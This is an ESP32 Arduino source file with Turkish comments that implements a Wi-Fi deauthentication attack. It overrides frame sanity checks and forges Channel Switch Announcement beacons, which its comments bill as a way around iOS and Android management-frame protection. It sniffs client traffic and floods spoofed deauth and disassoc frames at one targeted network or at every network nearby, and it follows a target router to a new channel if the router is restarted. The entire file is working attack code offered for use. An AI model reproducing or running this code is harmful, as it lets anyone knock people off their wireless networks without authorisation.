#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
deauth_frame_t deauth_frame;
int   deauth_type           = DEAUTH_TYPE_SINGLE;
int   eliminated_stations   = 0;
char  deauth_target_ssid[33] = {0};
uint8_t deauth_target_bssid[6] = {0};
int   deauth_target_channel = 1;

// ─── Düşük seviye bağımlılıklar ───────────────────────────────────────────────
extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// ─── CSA Beacon (iOS / Android PMF bypass) ───────────────────────────────────
// Channel Switch Announcement: hedef AP'den sahte beacon gönderir,
// istemcilere olmayan bir kanala geçmesini söyler → bağlantı kesilir.
void send_csa_beacon() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;

  const uint8_t *bssid   = deauth_frame.access_point;
  const char    *ssid    = deauth_target_ssid;
  uint8_t        channel = (uint8_t)deauth_target_channel;
  uint8_t        ssid_len = (uint8_t)strnlen(ssid, 32);

  // Beacon çerçevesi: MAC başlık (24B) + gövde (değişken)
  uint8_t buf[128];
  uint8_t *p = buf;

  // ── MAC Başlık ──
  *p++ = 0x80; *p++ = 0x00;            // Frame control: Beacon
  *p++ = 0x00; *p++ = 0x00;            // Duration
  memset(p, 0xFF, 6); p += 6;          // DA: broadcast
  memcpy(p, bssid, 6); p += 6;         // SA: hedef BSSID
  memcpy(p, bssid, 6); p += 6;         // BSSID
  *p++ = 0x00; *p++ = 0x00;            // Sequence control

  // ── Beacon Gövdesi ──
  memset(p, 0x00, 8); p += 8;          // Timestamp
  *p++ = 0x64; *p++ = 0x00;            // Beacon interval: 100 TU
  *p++ = 0x11; *p++ = 0x04;            // Capability: ESS + short slot

  // SSID IE
  *p++ = 0x00; *p++ = ssid_len;
  memcpy(p, ssid, ssid_len); p += ssid_len;

  // Supported Rates IE
  *p++ = 0x01; *p++ = 0x08;
  *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;
  *p++ = 0x24; *p++ = 0x30; *p++ = 0x48; *p++ = 0x6C;

  // DS Parameter Set IE (mevcut kanal)
  *p++ = 0x03; *p++ = 0x01; *p++ = channel;

  // CSA IE (Element ID=37): mod=1 (iletimi durdur), hedef kanal=14 (geçersiz bölge), count=1
  *p++ = 0x25; *p++ = 0x03;
  *p++ = 0x01;   // Mode 1: switch öncesi TX durur
  *p++ = 0x0E;   // Kanal 14 (TR/EU'da geçersiz → istemci devre dışı kalır)
  *p++ = 0x01;   // 1 beacon sonra geç

  int frame_len = (int)(p - buf);

  // Çoklu gönderim — güvenilirlik için
  for (int i = 0; i < 8; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, buf, frame_len, false);
    delayMicroseconds(500);
  }
}

// ─── Hedef yeniden bulma (router yeniden başlatılırsa) ─────────────────────────
void retrack_deauth_target() {
  if (deauth_type != DEAUTH_TYPE_SINGLE) return;
  if (strnlen(deauth_target_ssid, 33) == 0) return;

  DEBUG_PRINT("Hedef yeniden taraniyor: ");
  DEBUG_PRINTLN(deauth_target_ssid);

  esp_wifi_set_promiscuous(false);

  int n = WiFi.scanNetworks(false, true, false, 120);
  for (int i = 0; i < n; i++) {
    if (strcmp(WiFi.SSID(i).c_str(), deauth_target_ssid) == 0) {
      int new_ch = WiFi.channel(i);
      bool bssid_changed = memcmp(WiFi.BSSID(i), deauth_target_bssid, 6) != 0;
      bool chan_changed   = (new_ch != deauth_target_channel);

      if (chan_changed || bssid_changed) {
        deauth_target_channel = new_ch;
        memcpy(deauth_target_bssid, WiFi.BSSID(i), 6);
        memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
        memcpy(deauth_frame.sender,       deauth_target_bssid, 6);
        WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
        DEBUG_PRINTF("Hedef yeni kanal: %d\n", deauth_target_channel);
      }
      break;
    }
  }
  WiFi.scanDelete();

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

// ─── Promiscuous sniffer ───────────────────────────────────────────────────────
// iOS PMF bypass: hem deauth (0xC0) hem disassoc (0xA0) gönderilir
// Android 16+: birden fazla reason kodu + broadcast frame
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *pkt = (wifi_packet_t *)raw->payload;
  const mac_hdr_t *hdr = &pkt->hdr;

  if ((int16_t)(raw->rx_ctrl.sig_len - sizeof(mac_hdr_t)) < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(hdr->dest, deauth_frame.sender, 6) != 0) return;
    memcpy(deauth_frame.station, hdr->src, 6);

    // 1. Hedefli DEAUTH — reason 7 (Class 3 from non-assoc STA) iOS için en etkili
    deauth_frame.reason = 7;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

    // 2. Reason 6 (Class 2 from non-auth STA) — ek iOS/Android bypass
    deauth_frame.reason = 6;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

    // 3. DISASSOC (0xA0) reason 7 — PMF koruması olmayan iOS/Android
    deauth_frame.frame_control[0] = 0xA0;
    deauth_frame.reason = 7;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

    // 4. DISASSOC reason 3 (leaving BSS)
    deauth_frame.reason = 3;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH / 2; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

    // 5. Broadcast DEAUTH — AP'nin BSSID'inden tüm istemcilere
    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 3;
    for (int i = 0; i < 4; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

    // 6. Broadcast DISASSOC
    deauth_frame.frame_control[0] = 0xA0;
    for (int i = 0; i < 4; i++)
      esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);

    // Çerçeveyi geri yükle
    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;

  } else { // DEAUTH_TYPE_ALL
    if ((memcmp(hdr->dest, hdr->bssid, 6) != 0) ||
        (memcmp(hdr->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) == 0)) return;

    memcpy(deauth_frame.station,      hdr->src,  6);
    memcpy(deauth_frame.access_point, hdr->dest, 6);
    memcpy(deauth_frame.sender,       hdr->dest, 6);

    // DEAUTH
    deauth_frame.reason = 7;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);

    // DISASSOC
    deauth_frame.frame_control[0] = 0xA0;
    deauth_frame.reason = 7;
    for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++)
      esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);

    // Broadcast DEAUTH + DISASSOC
    memset(deauth_frame.station, 0xFF, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 3;
    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    deauth_frame.frame_control[0] = 0xA0;
    esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);

    // Geri yükle
    memcpy(deauth_frame.station, hdr->src, 6);
    deauth_frame.frame_control[0] = 0xC0;
    deauth_frame.reason = 1;
  }

  eliminated_stations++;
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

// ─── Saldırı başlat/durdur ────────────────────────────────────────────────────
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;
  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    strncpy(deauth_target_ssid, WiFi.SSID(wifi_number).c_str(), 32);
    deauth_target_ssid[32] = '\0';
    deauth_target_channel = WiFi.channel(wifi_number);
    memcpy(deauth_target_bssid, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.access_point, deauth_target_bssid, 6);
    memcpy(deauth_frame.sender,       deauth_target_bssid, 6);

    DEBUG_PRINT("Deauth baslatiyor: ");
    DEBUG_PRINTLN(deauth_target_ssid);

    WiFi.softAP(AP_SSID, AP_PASS, deauth_target_channel);
  } else {
    DEBUG_PRINTLN("Tum aglara deauth...");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  DEBUG_PRINTLN("Deauth durduruluyor...");
  esp_wifi_set_promiscuous(false);
  deauth_type = DEAUTH_TYPE_SINGLE;
  memset(deauth_target_ssid, 0, sizeof(deauth_target_ssid));
}
